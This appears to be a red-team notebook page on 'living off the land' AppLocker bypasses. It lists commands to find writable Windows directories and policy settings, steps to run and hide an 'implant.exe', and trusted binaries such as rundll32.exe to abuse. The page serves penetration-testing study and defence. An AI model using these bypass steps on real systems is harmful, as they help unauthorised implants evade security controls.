# Living off the Land

## 01 - Detect

### 1.1 - Applocker EXE Bypass

#### 1.1.1 - Command Prompt

```
C:\> icacls.exe C:\Windows\Task
```

#### 1.1.2 - PowerShell

```
PS C:\> Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrvV2\Exe
```

#### 1.1.3 - GPEdit

Local Computer Policy > User Configuration > Administrative Templates > System

### 1.2 - Applocker DLL Bypass

```
C:\> accesschk.exe "<username>" C:\Windows -wus
```

## 02 - Exploit

### 2.1 - World Writable Directories

```
C:\> C:\Windows\Task\implant.exe
```

### 2.2 - Create Directory

```
C:\Users\Administrator\Desktop> md Datasheet

C:\Users\Administrator\Desktop> move implant.exe Datasheet
```

### 2.3 - Masquerade Programs

```
msedge.exe
explorer.exe
```

### 2.4 - Whitelisted Executable Programs

```
rundll32.exe
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xD - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Windows/Code Execution/HTA]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xD - Client-Side Attacks/Delivery Methods/File Attachment/Web Drive-by/Windows/Manual/Living off the Land]]

- [[Scriptlet]]

- [[Windows Scripting Host]]

- [[WMI]]

- [[ForFiles]]

- [[DLL Execution]]

### Red Team Notes

- [Red Team Notes: Application Whitelisting Bypass with WMIC and XSL](https://www.ired.team/offensive-security/code-execution/application-whitelisting-bypass-with-wmic-and-xsl)

### Pentestlab

- [Pentestlab Blog: AppLocker Bypass - CMSTP](https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/)